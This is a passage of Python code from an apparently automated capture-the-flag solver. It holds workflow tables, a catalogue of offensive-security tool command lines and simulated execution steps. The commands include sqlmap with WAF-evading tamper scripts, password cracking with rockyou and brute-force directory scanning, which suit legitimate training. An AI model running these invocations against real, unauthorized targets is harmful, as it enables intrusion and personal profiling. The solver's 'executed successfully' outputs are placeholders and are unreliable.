                {"step": 1, "action": "challenge_analysis", "description": "Analyze challenge type and requirements", "parallel": False, "tools": ["manual"], "estimated_time": 300},
                {"step": 2, "action": "encoding_detection", "description": "Detect encoding or obfuscation methods", "parallel": True, "tools": ["base64", "hex", "rot13"], "estimated_time": 600},
                {"step": 3, "action": "format_identification", "description": "Identify file formats or data structures", "parallel": False, "tools": ["file", "binwalk"], "estimated_time": 300},
                {"step": 4, "action": "specialized_analysis", "description": "Apply specialized analysis techniques", "parallel": True, "tools": ["qr-decoder", "audio-analysis"], "estimated_time": 900},
                {"step": 5, "action": "pattern_recognition", "description": "Identify patterns and relationships", "parallel": False, "tools": ["manual"], "estimated_time": 600},
                {"step": 6, "action": "solution_implementation", "description": "Implement solution approach", "parallel": False, "tools": ["python", "custom"], "estimated_time": 900},
                {"step": 7, "action": "validation", "description": "Validate solution and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
            ],
            "osint": [
                {"step": 1, "action": "target_identification", "description": "Identify and validate targets", "parallel": False, "tools": ["manual"], "estimated_time": 300},
                {"step": 2, "action": "automated_reconnaissance", "description": "Automated OSINT gathering", "parallel": True, "tools": ["sherlock", "theHarvester", "sublist3r"], "estimated_time": 1200},
                {"step": 3, "action": "social_media_analysis", "description": "Social media intelligence gathering", "parallel": True, "tools": ["sherlock", "social-analyzer"], "estimated_time": 900},
                {"step": 4, "action": "domain_analysis", "description": "Domain and DNS intelligence", "parallel": True, "tools": ["whois", "dig", "amass"], "estimated_time": 600},
                {"step": 5, "action": "search_engine_intelligence", "description": "Search engine and database queries", "parallel": True, "tools": ["shodan", "censys"], "estimated_time": 900},
                {"step": 6, "action": "correlation_analysis", "description": "Correlate information across sources", "parallel": False, "tools": ["manual"], "estimated_time": 1200},
                {"step": 7, "action": "verification", "description": "Verify findings and extract flag", "parallel": False, "tools": ["manual"], "estimated_time": 600}
            ]
        }

        return advanced_workflows.get(challenge.category, [
            {"step": 1, "action": "analysis", "description": "Analyze the challenge", "parallel": False, "tools": ["manual"], "estimated_time": 600},
            {"step": 2, "action": "research", "description": "Research relevant techniques", "parallel": False, "tools": ["manual"], "estimated_time": 900},
            {"step": 3, "action": "implementation", "description": "Implement solution", "parallel": False, "tools": ["custom"], "estimated_time": 1800},
            {"step": 4, "action": "testing", "description": "Test the solution", "parallel": False, "tools": ["manual"], "estimated_time": 600},
            {"step": 5, "action": "refinement", "description": "Refine approach if needed", "parallel": False, "tools": ["manual"], "estimated_time": 900},
            {"step": 6, "action": "flag_submission", "description": "Submit the flag", "parallel": False, "tools": ["manual"], "estimated_time": 300}
        ])

    def _identify_parallel_tasks(self, category: str) -> List[Dict[str, Any]]:
        """Identify tasks that can be executed in parallel for efficiency"""
        parallel_tasks = {
            "web": [
                {"task_group": "reconnaissance", "tasks": ["httpx", "whatweb", "katana"], "max_concurrent": 3},
                {"task_group": "directory_enumeration", "tasks": ["gobuster", "dirsearch", "feroxbuster"], "max_concurrent": 2},
                {"task_group": "parameter_discovery", "tasks": ["arjun", "paramspider"], "max_concurrent": 2},
                {"task_group": "vulnerability_scanning", "tasks": ["sqlmap", "dalfox", "nikto"], "max_concurrent": 2}
            ],
            "crypto": [
                {"task_group": "hash_cracking", "tasks": ["hashcat", "john"], "max_concurrent": 2},
                {"task_group": "cipher_analysis", "tasks": ["frequency-analysis", "substitution-solver"], "max_concurrent": 2},
                {"task_group": "factorization", "tasks": ["factordb", "yafu"], "max_concurrent": 2}
            ],
            "pwn": [
                {"task_group": "binary_analysis", "tasks": ["checksec", "file", "strings", "objdump"], "max_concurrent": 4},
                {"task_group": "static_analysis", "tasks": ["ghidra", "radare2"], "max_concurrent": 2},
                {"task_group": "gadget_finding", "tasks": ["ropper", "ropgadget"], "max_concurrent": 2}
            ],
            "forensics": [
                {"task_group": "file_analysis", "tasks": ["binwalk", "foremost", "strings"], "max_concurrent": 3},
                {"task_group": "steganography", "tasks": ["stegsolve", "zsteg", "outguess"], "max_concurrent": 3},
                {"task_group": "metadata_extraction", "tasks": ["exiftool", "steghide"], "max_concurrent": 2}
            ],
            "rev": [
                {"task_group": "initial_analysis", "tasks": ["file", "strings", "checksec"], "max_concurrent": 3},
                {"task_group": "disassembly", "tasks": ["ghidra", "radare2"], "max_concurrent": 2},
                {"task_group": "packer_detection", "tasks": ["upx", "peid", "detect-it-easy"], "max_concurrent": 3}
            ],
            "osint": [
                {"task_group": "username_search", "tasks": ["sherlock", "social-analyzer"], "max_concurrent": 2},
                {"task_group": "domain_recon", "tasks": ["sublist3r", "amass", "dig"], "max_concurrent": 3},
                {"task_group": "search_engines", "tasks": ["shodan", "censys"], "max_concurrent": 2}
            ],
            "misc": [
                {"task_group": "encoding_detection", "tasks": ["base64", "hex", "rot13"], "max_concurrent": 3},
                {"task_group": "format_analysis", "tasks": ["file", "binwalk"], "max_concurrent": 2}
            ]
        }

        return parallel_tasks.get(category, [])

    def _calculate_resource_requirements(self, challenge: CTFChallenge) -> Dict[str, Any]:
        """Calculate estimated resource requirements for challenge"""
        base_requirements = {
            "cpu_cores": 2,
            "memory_mb": 2048,
            "disk_space_mb": 1024,
            "network_bandwidth": "medium",
            "gpu_required": False,
            "special_tools": []
        }

        # Adjust based on category
        category_adjustments = {
            "web": {"cpu_cores": 4, "memory_mb": 4096, "network_bandwidth": "high"},
            "crypto": {"cpu_cores": 8, "memory_mb": 8192, "gpu_required": True},
            "pwn": {"cpu_cores": 4, "memory_mb": 4096, "special_tools": ["gdb", "pwntools"]},
            "forensics": {"cpu_cores": 2, "memory_mb": 8192, "disk_space_mb": 4096},
            "rev": {"cpu_cores": 4, "memory_mb": 8192, "special_tools": ["ghidra", "ida"]},
            "osint": {"cpu_cores": 2, "memory_mb": 2048, "network_bandwidth": "high"},
            "misc": {"cpu_cores": 2, "memory_mb": 2048}
        }

        if challenge.category in category_adjustments:
            base_requirements.update(category_adjustments[challenge.category])

        # Adjust based on difficulty
        difficulty_multipliers = {
            "easy": 1.0,
            "medium": 1.2,
            "hard": 1.5,
            "insane": 2.0,
            "unknown": 1.3
        }

        multiplier = difficulty_multipliers[challenge.difficulty]
        base_requirements["cpu_cores"] = int(base_requirements["cpu_cores"] * multiplier)
        base_requirements["memory_mb"] = int(base_requirements["memory_mb"] * multiplier)
        base_requirements["disk_space_mb"] = int(base_requirements["disk_space_mb"] * multiplier)

        return base_requirements

    def _predict_expected_artifacts(self, challenge: CTFChallenge) -> List[Dict[str, str]]:
        """Predict expected artifacts and outputs from challenge solving"""
        artifacts = {
            "web": [
                {"type": "http_responses", "description": "HTTP response data and headers"},
                {"type": "source_code", "description": "Downloaded source code and scripts"},
                {"type": "directory_lists", "description": "Discovered directories and files"},
                {"type": "vulnerability_reports", "description": "Vulnerability scan results"},
                {"type": "exploit_payloads", "description": "Working exploit payloads"},
                {"type": "session_data", "description": "Session tokens and cookies"}
            ],
            "crypto": [
                {"type": "plaintext", "description": "Decrypted plaintext data"},
                {"type": "keys", "description": "Recovered encryption keys"},
                {"type": "cipher_analysis", "description": "Cipher analysis results"},
                {"type": "frequency_data", "description": "Frequency analysis data"},
                {"type": "mathematical_proof", "description": "Mathematical proof of solution"}
            ],
            "pwn": [
                {"type": "exploit_code", "description": "Working exploit code"},
                {"type": "shellcode", "description": "Custom shellcode payloads"},
                {"type": "memory_dumps", "description": "Memory dumps and analysis"},
                {"type": "rop_chains", "description": "ROP chain constructions"},
                {"type": "debug_output", "description": "Debugging session outputs"}
            ],
            "forensics": [
                {"type": "recovered_files", "description": "Recovered deleted files"},
                {"type": "extracted_data", "description": "Extracted hidden data"},
                {"type": "timeline", "description": "Timeline of events"},
                {"type": "metadata", "description": "File metadata and properties"},
                {"type": "network_flows", "description": "Network traffic analysis"}
            ],
            "rev": [
                {"type": "decompiled_code", "description": "Decompiled source code"},
                {"type": "algorithm_analysis", "description": "Identified algorithms"},
                {"type": "key_values", "description": "Extracted keys and constants"},
                {"type": "control_flow", "description": "Control flow analysis"},
                {"type": "solution_script", "description": "Solution implementation script"}
            ],
            "osint": [
                {"type": "intelligence_report", "description": "Compiled intelligence report"},
                {"type": "social_profiles", "description": "Discovered social media profiles"},
                {"type": "domain_data", "description": "Domain registration and DNS data"},
                {"type": "correlation_matrix", "description": "Information correlation analysis"},
                {"type": "verification_data", "description": "Verification of findings"}
            ],
            "misc": [
                {"type": "decoded_data", "description": "Decoded or decrypted data"},
                {"type": "pattern_analysis", "description": "Pattern recognition results"},
                {"type": "solution_explanation", "description": "Explanation of solution approach"},
                {"type": "intermediate_results", "description": "Intermediate calculation results"}
            ]
        }

        return artifacts.get(challenge.category, [
            {"type": "solution_data", "description": "Solution-related data"},
            {"type": "analysis_results", "description": "Analysis results and findings"}
        ])

    def _create_validation_steps(self, category: str) -> List[Dict[str, str]]:
        """Create validation steps to verify solution correctness"""
        validation_steps = {
            "web": [
                {"step": "response_validation", "description": "Validate HTTP responses and status codes"},
                {"step": "payload_verification", "description": "Verify exploit payloads work correctly"},
                {"step": "flag_format_check", "description": "Check flag format matches expected pattern"},
                {"step": "reproducibility_test", "description": "Test solution reproducibility"}
            ],
            "crypto": [
                {"step": "decryption_verification", "description": "Verify decryption produces readable text"},
                {"step": "key_validation", "description": "Validate recovered keys are correct"},
                {"step": "mathematical_check", "description": "Verify mathematical correctness"},
                {"step": "flag_extraction", "description": "Extract and validate flag from plaintext"}
            ],
            "pwn": [
                {"step": "exploit_reliability", "description": "Test exploit reliability and success rate"},
                {"step": "payload_verification", "description": "Verify payload executes correctly"},
                {"step": "shell_validation", "description": "Validate shell access and commands"},
                {"step": "flag_retrieval", "description": "Successfully retrieve flag from target"}
            ],
            "forensics": [
                {"step": "data_integrity", "description": "Verify integrity of recovered data"},
                {"step": "timeline_accuracy", "description": "Validate timeline accuracy"},
                {"step": "evidence_correlation", "description": "Verify evidence correlation is correct"},
                {"step": "flag_location", "description": "Confirm flag location and extraction"}
            ],
            "rev": [
                {"step": "algorithm_accuracy", "description": "Verify algorithm identification is correct"},
                {"step": "key_extraction", "description": "Validate extracted keys and values"},
                {"step": "solution_testing", "description": "Test solution against known inputs"},
                {"step": "flag_generation", "description": "Generate correct flag using solution"}
            ],
            "osint": [
                {"step": "source_verification", "description": "Verify information sources are reliable"},
                {"step": "cross_reference", "description": "Cross-reference findings across sources"},
                {"step": "accuracy_check", "description": "Check accuracy of gathered intelligence"},
                {"step": "flag_confirmation", "description": "Confirm flag from verified information"}
            ],
            "misc": [
                {"step": "solution_verification", "description": "Verify solution approach is correct"},
                {"step": "output_validation", "description": "Validate output format and content"},
                {"step": "edge_case_testing", "description": "Test solution with edge cases"},
                {"step": "flag_extraction", "description": "Extract and validate final flag"}
            ]
        }

        return validation_steps.get(category, [
            {"step": "general_validation", "description": "General solution validation"},
            {"step": "flag_verification", "description": "Verify flag format and correctness"}
        ])

class CTFToolManager:
    """Advanced tool manager for CTF challenges with comprehensive tool arsenal"""

    def __init__(self):
        self.tool_commands = {
            # Web Application Security Tools
            "httpx": "httpx -probe -tech-detect -status-code -title -content-length",
            "katana": "katana -depth 3 -js-crawl -form-extraction -headless",
            "sqlmap": "sqlmap --batch --level 3 --risk 2 --threads 5",
            "dalfox": "dalfox url --mining-dom --mining-dict --deep-domxss",
            "gobuster": "gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js",
            "dirsearch": "dirsearch -u {} -e php,html,js,txt,xml,json -t 50",
            "feroxbuster": "feroxbuster -u {} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt",
            "arjun": "arjun -u {} --get --post",
            "paramspider": "paramspider -d {}",
            "wpscan": "wpscan --url {} --enumerate ap,at,cb,dbe",
            "nikto": "nikto -h {} -C all",
            "whatweb": "whatweb -v -a 3",

            # Cryptography Challenge Tools
            "hashcat": "hashcat -m 0 -a 0 --potfile-disable --quiet",
            "john": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5",
            "hash-identifier": "hash-identifier",
            "hashid": "hashid -m",
            "cipher-identifier": "python3 /opt/cipher-identifier/cipher_identifier.py",
            "factordb": "python3 /opt/factordb/factordb.py",
            "rsatool": "python3 /opt/rsatool/rsatool.py",
            "yafu": "yafu",
            "sage": "sage -python",
            "openssl": "openssl",
            "gpg": "gpg --decrypt",
            "steganography": "stegcracker",
            "frequency-analysis": "python3 /opt/frequency-analysis/freq_analysis.py",
            "substitution-solver": "python3 /opt/substitution-solver/solve.py",
            "vigenere-solver": "python3 /opt/vigenere-solver/vigenere.py",
            "base64": "base64 -d",
            "base32": "base32 -d",
            "hex": "xxd -r -p",
            "rot13": "tr 'A-Za-z' 'N-ZA-Mn-za-m'",

            # Binary Exploitation (Pwn) Tools
            "checksec": "checksec --file",
            "pwntools": "python3 -c 'from pwn import *; context.log_level = \"debug\"'",
            "ropper": "ropper --file {} --search",
            "ropgadget": "ROPgadget --binary",
            "one-gadget": "one_gadget",
            "gdb-peda": "gdb -ex 'source /opt/peda/peda.py'",
            "gdb-gef": "gdb -ex 'source /opt/gef/gef.py'",
            "gdb-pwngdb": "gdb -ex 'source /opt/Pwngdb/pwngdb.py'",
            "angr": "python3 -c 'import angr'",
            "radare2": "r2 -A",
            "ghidra": "analyzeHeadless /tmp ghidra_project -import",
            "binary-ninja": "binaryninja",
            "ltrace": "ltrace",
            "strace": "strace -f",
            "objdump": "objdump -d -M intel",
            "readelf": "readelf -a",
            "nm": "nm -D",
            "ldd": "ldd",
            "file": "file",
            "strings": "strings -n 8",
            "hexdump": "hexdump -C",
            "pwninit": "pwninit",
            "libc-database": "python3 /opt/libc-database/find.py",

            # Forensics Investigation Tools
            "binwalk": "binwalk -e --dd='.*'",
            "foremost": "foremost -i {} -o /tmp/foremost_output",
            "photorec": "photorec /log /cmd",
            "testdisk": "testdisk /log",
            "exiftool": "exiftool -all",
            "steghide": "steghide extract -sf {} -p ''",
            "stegsolve": "java -jar /opt/stegsolve/stegsolve.jar",
            "zsteg": "zsteg -a",
            "outguess": "outguess -r",
            "jsteg": "jsteg reveal",
            "volatility": "volatility -f {} imageinfo",
            "volatility3": "python3 /opt/volatility3/vol.py -f",
            "rekall": "rekall -f",
            "wireshark": "tshark -r",
            "tcpdump": "tcpdump -r",
            "networkminer": "mono /opt/NetworkMiner/NetworkMiner.exe",
            "autopsy": "autopsy",
            "sleuthkit": "fls -r",
            "scalpel": "scalpel -c /etc/scalpel/scalpel.conf",
            "bulk-extractor": "bulk_extractor -o /tmp/bulk_output",
            "ddrescue": "ddrescue",
            "dc3dd": "dc3dd",

            # Reverse Engineering Tools
            "ida": "ida64",
            "ida-free": "ida64 -A",
            "retdec": "retdec-decompiler",
            "upx": "upx -d",
            "peid": "peid",
            "detect-it-easy": "die",
            "x64dbg": "x64dbg",
            "ollydbg": "ollydbg",
            "immunity": "immunity",
            "windbg": "windbg",
            "apktool": "apktool d",
            "jadx": "jadx",
            "dex2jar": "dex2jar",
            "jd-gui": "jd-gui",
            "dnspy": "dnspy",
            "ilspy": "ilspy",
            "dotpeek": "dotpeek",

            # OSINT and Reconnaissance Tools
            "sherlock": "sherlock",
            "social-analyzer": "social-analyzer",
            "theHarvester": "theHarvester -d {} -b all",
            "recon-ng": "recon-ng",
            "maltego": "maltego",
            "spiderfoot": "spiderfoot",
            "shodan": "shodan search",
            "censys": "censys search",
            "whois": "whois",
            "dig": "dig",
            "nslookup": "nslookup",
            "host": "host",
            "dnsrecon": "dnsrecon -d",
            "fierce": "fierce -dns",
            "sublist3r": "sublist3r -d",
            "amass": "amass enum -d",
            "assetfinder": "assetfinder",
            "subfinder": "subfinder -d",
            "waybackurls": "waybackurls",
            "gau": "gau",
            "httpx-osint": "httpx -title -tech-detect -status-code",

            # Miscellaneous Challenge Tools
            "qr-decoder": "zbarimg",
            "barcode-decoder": "zbarimg",
            "audio-analysis": "audacity",
            "sonic-visualizer": "sonic-visualizer",
            "spectrum-analyzer": "python3 /opt/spectrum-analyzer/analyze.py",
            "brainfuck": "python3 /opt/brainfuck/bf.py",
            "whitespace": "python3 /opt/whitespace/ws.py",
            "piet": "python3 /opt/piet/piet.py",
            "malbolge": "python3 /opt/malbolge/malbolge.py",
            "ook": "python3 /opt/ook/ook.py",
            "zip": "unzip -P",
            "7zip": "7z x -p",
            "rar": "unrar x -p",
            "tar": "tar -xf",
            "gzip": "gunzip",
            "bzip2": "bunzip2",
            "xz": "unxz",
            "lzma": "unlzma",
            "compress": "uncompress",

            # Modern Web Technologies
            "jwt-tool": "python3 /opt/jwt_tool/jwt_tool.py",
            "jwt-cracker": "jwt-cracker",
            "graphql-voyager": "graphql-voyager",
            "graphql-playground": "graphql-playground",
            "postman": "newman run",
            "burpsuite": "java -jar /opt/burpsuite/burpsuite.jar",
            "owasp-zap": "zap.sh -cmd",
            "websocket-king": "python3 /opt/websocket-king/ws_test.py",

            # Cloud and Container Security
            "docker": "docker",
            "kubectl": "kubectl",
            "aws-cli": "aws",
            "azure-cli": "az",
            "gcloud": "gcloud",
            "terraform": "terraform",
            "ansible": "ansible",

            # Mobile Application Security
            "adb": "adb",
            "frida": "frida",
            "objection": "objection",
            "mobsf": "python3 /opt/mobsf/manage.py",
            "apkleaks": "apkleaks -f",
            "qark": "qark --apk"
        }

        # Tool categories for intelligent selection
        self.tool_categories = {
            "web_recon": ["httpx", "katana", "waybackurls", "gau", "whatweb"],
            "web_vuln": ["sqlmap", "dalfox", "nikto", "wpscan"],
            "web_discovery": ["gobuster", "dirsearch", "feroxbuster"],
            "web_params": ["arjun", "paramspider"],
            "crypto_hash": ["hashcat", "john", "hash-identifier", "hashid"],
            "crypto_cipher": ["cipher-identifier", "frequency-analysis", "substitution-solver"],
            "crypto_rsa": ["rsatool", "factordb", "yafu"],
            "crypto_modern": ["sage", "openssl", "gpg"],
            "pwn_analysis": ["checksec", "file", "strings", "objdump", "readelf"],
            "pwn_exploit": ["pwntools", "ropper", "ropgadget", "one-gadget"],
            "pwn_debug": ["gdb-peda", "gdb-gef", "ltrace", "strace"],
            "pwn_advanced": ["angr", "ghidra", "radare2"],
            "forensics_file": ["binwalk", "foremost", "photorec", "exiftool"],
            "forensics_image": ["steghide", "stegsolve", "zsteg", "outguess"],
            "forensics_memory": ["volatility", "volatility3", "rekall"],
            "forensics_network": ["wireshark", "tcpdump", "networkminer"],
            "rev_static": ["ghidra", "ida", "radare2", "strings"],
            "rev_dynamic": ["gdb-peda", "ltrace", "strace"],
            "rev_unpack": ["upx", "peid", "detect-it-easy"],
            "osint_social": ["sherlock", "social-analyzer", "theHarvester"],
            "osint_domain": ["whois", "dig", "sublist3r", "amass"],
            "osint_search": ["shodan", "censys", "recon-ng"],
            "misc_encoding": ["base64", "base32", "hex", "rot13"],
            "misc_compression": ["zip", "7zip", "rar", "tar"],
            "misc_esoteric": ["brainfuck", "whitespace", "piet", "malbolge"]
        }

    def get_tool_command(self, tool: str, target: str, additional_args: str = "") -> str:
        """Get optimized command for CTF tool with intelligent parameter selection"""
        base_command = self.tool_commands.get(tool, tool)

        # Add intelligent parameter optimization based on tool type
        if tool in ["hashcat", "john"]:
            # For hash cracking, add common wordlists and rules
            if "wordlist" not in base_command:
                base_command += " --wordlist=/usr/share/wordlists/rockyou.txt"
            if tool == "hashcat" and "--rules" not in base_command:
                base_command += " --rules-file=/usr/share/hashcat/rules/best64.rule"

        elif tool in ["sqlmap"]:
            # For SQL injection, add tamper scripts and optimization
            if "--tamper" not in base_command:
                base_command += " --tamper=space2comment,charencode,randomcase"
            if "--threads" not in base_command:
                base_command += " --threads=5"

        elif tool in ["gobuster", "dirsearch", "feroxbuster"]:
            # For directory brute forcing, optimize threads and extensions
            if tool == "gobuster" and "-t" not in base_command:
                base_command += " -t 50"
            elif tool == "dirsearch" and "-t" not in base_command:
                base_command += " -t 50"
            elif tool == "feroxbuster" and "-t" not in base_command:
                base_command += " -t 50"

        if additional_args:
            return f"{base_command} {additional_args} {target}"
        else:
            return f"{base_command} {target}"

    def get_category_tools(self, category: str) -> List[str]:
        """Get all tools for a specific category"""
        return self.tool_categories.get(category, [])

    def suggest_tools_for_challenge(self, challenge_description: str, category: str) -> List[str]:
        """Suggest optimal tools based on challenge description and category"""
        suggested_tools = []
        description_lower = challenge_description.lower()

        # Category-based tool suggestions
        if category == "web":
            suggested_tools.extend(self.tool_categories["web_recon"][:2])

            if any(keyword in description_lower for keyword in ["sql", "injection", "database", "mysql", "postgres"]):
                suggested_tools.extend(["sqlmap", "hash-identifier"])
            if any(keyword in description_lower for keyword in ["xss", "script", "javascript", "dom"]):
                suggested_tools.extend(["dalfox", "katana"])
            if any(keyword in description_lower for keyword in ["wordpress", "wp", "cms"]):
                suggested_tools.append("wpscan")
            if any(keyword in description_lower for keyword in ["directory", "hidden", "files", "admin"]):
                suggested_tools.extend(["gobuster", "dirsearch"])
            if any(keyword in description_lower for keyword in ["parameter", "param", "get", "post"]):
                suggested_tools.extend(["arjun", "paramspider"])
            if any(keyword in description_lower for keyword in ["jwt", "token", "session"]):
                suggested_tools.append("jwt-tool")
            if any(keyword in description_lower for keyword in ["graphql", "api"]):
                suggested_tools.append("graphql-voyager")

        elif category == "crypto":
            if any(keyword in description_lower for keyword in ["hash", "md5", "sha", "password"]):
                suggested_tools.extend(["hashcat", "john", "hash-identifier"])
            if any(keyword in description_lower for keyword in ["rsa", "public key", "private key", "factorization"]):
                suggested_tools.extend(["rsatool", "factordb", "yafu"])
            if any(keyword in description_lower for keyword in ["cipher", "encrypt", "decrypt", "substitution"]):
                suggested_tools.extend(["cipher-identifier", "frequency-analysis"])
            if any(keyword in description_lower for keyword in ["vigenere", "polyalphabetic"]):
                suggested_tools.append("vigenere-solver")
            if any(keyword in description_lower for keyword in ["base64", "base32", "encoding"]):
                suggested_tools.extend(["base64", "base32"])
            if any(keyword in description_lower for keyword in ["rot", "caesar", "shift"]):
                suggested_tools.append("rot13")
            if any(keyword in description_lower for keyword in ["pgp", "gpg", "signature"]):
                suggested_tools.append("gpg")

        elif category == "pwn":
            suggested_tools.extend(["checksec", "file", "strings"])

            if any(keyword in description_lower for keyword in ["buffer", "overflow", "bof"]):
                suggested_tools.extend(["pwntools", "gdb-peda", "ropper"])
            if any(keyword in description_lower for keyword in ["format", "printf", "string"]):
                suggested_tools.extend(["pwntools", "gdb-peda"])
            if any(keyword in description_lower for keyword in ["heap", "malloc", "free"]):
                suggested_tools.extend(["pwntools", "gdb-gef"])
            if any(keyword in description_lower for keyword in ["rop", "gadget", "chain"]):
                suggested_tools.extend(["ropper", "ropgadget"])
            if any(keyword in description_lower for keyword in ["shellcode", "exploit"]):
                suggested_tools.extend(["pwntools", "one-gadget"])
            if any(keyword in description_lower for keyword in ["canary", "stack", "protection"]):
                suggested_tools.extend(["checksec", "pwntools"])

        elif category == "forensics":
            if any(keyword in description_lower for keyword in ["image", "jpg", "png", "gif", "steganography"]):
                suggested_tools.extend(["exiftool", "steghide", "stegsolve", "zsteg"])
            if any(keyword in description_lower for keyword in ["memory", "dump", "ram"]):
                suggested_tools.extend(["volatility", "volatility3"])
            if any(keyword in description_lower for keyword in ["network", "pcap", "wireshark", "traffic"]):
                suggested_tools.extend(["wireshark", "tcpdump"])
            if any(keyword in description_lower for keyword in ["file", "deleted", "recovery", "carving"]):
                suggested_tools.extend(["binwalk", "foremost", "photorec"])
            if any(keyword in description_lower for keyword in ["disk", "filesystem", "partition"]):
                suggested_tools.extend(["testdisk", "sleuthkit"])
            if any(keyword in description_lower for keyword in ["audio", "wav", "mp3", "sound"]):
                suggested_tools.extend(["audacity", "sonic-visualizer"])

        elif category == "rev":
            suggested_tools.extend(["file", "strings", "objdump"])

            if any(keyword in description_lower for keyword in ["packed", "upx", "packer"]):
                suggested_tools.extend(["upx", "peid", "detect-it-easy"])
            if any(keyword in description_lower for keyword in ["android", "apk", "mobile"]):
                suggested_tools.extend(["apktool", "jadx", "dex2jar"])
            if any(keyword in description_lower for keyword in [".net", "dotnet", "csharp"]):
                suggested_tools.extend(["dnspy", "ilspy"])
            if any(keyword in description_lower for keyword in ["java", "jar", "class"]):
                suggested_tools.extend(["jd-gui", "jadx"])
            if any(keyword in description_lower for keyword in ["windows", "exe", "dll"]):
                suggested_tools.extend(["ghidra", "ida", "x64dbg"])
            if any(keyword in description_lower for keyword in ["linux", "elf", "binary"]):
                suggested_tools.extend(["ghidra", "radare2", "gdb-peda"])

        elif category == "osint":
            if any(keyword in description_lower for keyword in ["username", "social", "media"]):
                suggested_tools.extend(["sherlock", "social-analyzer"])
            if any(keyword in description_lower for keyword in ["domain", "subdomain", "dns"]):
                suggested_tools.extend(["sublist3r", "amass", "dig"])
            if any(keyword in description_lower for keyword in ["email", "harvest", "contact"]):
                suggested_tools.append("theHarvester")
            if any(keyword in description_lower for keyword in ["ip", "port", "service"]):
                suggested_tools.extend(["shodan", "censys"])
            if any(keyword in description_lower for keyword in ["whois", "registration", "owner"]):
                suggested_tools.append("whois")

        elif category == "misc":
            if any(keyword in description_lower for keyword in ["qr", "barcode", "code"]):
                suggested_tools.append("qr-decoder")
            if any(keyword in description_lower for keyword in ["zip", "archive", "compressed"]):
                suggested_tools.extend(["zip", "7zip", "rar"])
            if any(keyword in description_lower for keyword in ["brainfuck", "bf", "esoteric"]):
                suggested_tools.append("brainfuck")
            if any(keyword in description_lower for keyword in ["whitespace", "ws"]):
                suggested_tools.append("whitespace")
            if any(keyword in description_lower for keyword in ["piet", "image", "program"]):
                suggested_tools.append("piet")

        # Remove duplicates while preserving order
        return list(dict.fromkeys(suggested_tools))

# ============================================================================
# ADVANCED CTF AUTOMATION AND CHALLENGE SOLVING (v8.0 ENHANCEMENT)
# ============================================================================

class CTFChallengeAutomator:
    """Advanced automation system for CTF challenge solving"""

    def __init__(self):
        self.active_challenges = {}
        self.solution_cache = {}
        self.learning_database = {}
        self.success_patterns = {}

    def auto_solve_challenge(self, challenge: CTFChallenge) -> Dict[str, Any]:
        """Attempt to automatically solve a CTF challenge"""
        result = {
            "challenge_id": challenge.name,
            "status": "in_progress",
            "automated_steps": [],
            "manual_steps": [],
            "confidence": 0.0,
            "estimated_completion": 0,
            "artifacts": [],
            "flag_candidates": [],
            "next_actions": []
        }

        try:
            # Create workflow
            workflow = ctf_manager.create_ctf_challenge_workflow(challenge)

            # Execute automated steps
            for step in workflow["workflow_steps"]:
                if step.get("parallel", False):
                    step_result = self._execute_parallel_step(step, challenge)
                else:
                    step_result = self._execute_sequential_step(step, challenge)

                result["automated_steps"].append(step_result)

                # Check for flag candidates
                flag_candidates = self._extract_flag_candidates(step_result.get("output", ""))
                result["flag_candidates"].extend(flag_candidates)

                # Update confidence based on step success
                if step_result.get("success", False):
                    result["confidence"] += 0.1

                # Early termination if flag found
                if flag_candidates and self._validate_flag_format(flag_candidates[0]):
                    result["status"] = "solved"
                    result["flag"] = flag_candidates[0]
                    break

            # If not solved automatically, provide manual guidance
            if result["status"] != "solved":
                result["manual_steps"] = self._generate_manual_guidance(challenge, result)
                result["status"] = "needs_manual_intervention"

            result["confidence"] = min(1.0, result["confidence"])

        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            logger.error(f"Error in auto-solve for {challenge.name}: {str(e)}")

        return result

    def _execute_parallel_step(self, step: Dict[str, Any], challenge: CTFChallenge) -> Dict[str, Any]:
        """Execute a step with parallel tool execution"""
        step_result = {
            "step": step["step"],
            "action": step["action"],
            "success": False,
            "output": "",
            "tools_used": [],
            "execution_time": 0,
            "artifacts": []
        }

        start_time = time.time()
        tools = step.get("tools", [])

        # Execute tools in parallel (simulated for now)
        for tool in tools:
            try:
                if tool != "manual":
                    command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
                    # In a real implementation, this would execute the command
                    step_result["tools_used"].append(tool)
                    step_result["output"] += f"[{tool}] Executed successfully\n"
                    step_result["success"] = True
            except Exception as e:
                step_result["output"] += f"[{tool}] Error: {str(e)}\n"

        step_result["execution_time"] = time.time() - start_time
        return step_result

    def _execute_sequential_step(self, step: Dict[str, Any], challenge: CTFChallenge) -> Dict[str, Any]:
        """Execute a step sequentially"""
        step_result = {
            "step": step["step"],
            "action": step["action"],
            "success": False,
            "output": "",
            "tools_used": [],
            "execution_time": 0,
            "artifacts": []
        }

        start_time = time.time()
        tools = step.get("tools", [])

        for tool in tools:
            try:
                if tool == "manual":
                    step_result["output"] += f"[MANUAL] {step['description']}\n"
                    step_result["success"] = True
                elif tool == "custom":
                    step_result["output"] += f"[CUSTOM] Custom implementation required\n"
                    step_result["success"] = True
                else:
                    command = ctf_tools.get_tool_command(tool, challenge.target or challenge.name)
                    step_result["tools_used"].append(tool)
                    step_result["output"] += f"[{tool}] Command: {command}\n"
                    step_result["success"] = True
            except Exception as e:
                step_result["output"] += f"[{tool}] Error: {str(e)}\n"

        step_result["execution_time"] = time.time() - start_time
        return step_result

    def _extract_flag_candidates(self, output: str) -> List[str]:
        """Extract potential flags from tool output"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[a-zA-Z0-9_]+\{[^}]+\}',
            r'[0-9a-f]{32}',  # MD5 hash
            r'[0-9a-f]{40}',  # SHA1 hash
            r'[0-9a-f]{64}'   # SHA256 hash
        ]

        candidates = []
        for pattern in flag_patterns:
            matches = re.findall(pattern, output, re.IGNORECASE)
            candidates.extend(matches)

        return list(set(candidates))  # Remove duplicates

    def _validate_flag_format(self, flag: str) -> bool:
        """Validate if a string matches common flag formats"""
        common_formats = [
            r'^flag\{.+\}$',
            r'^FLAG\{.+\}$',
            r'^ctf\{.+\}$',
            r'^CTF\{.+\}$',
            r'^[a-zA-Z0-9_]+\{.+\}$'
        ]

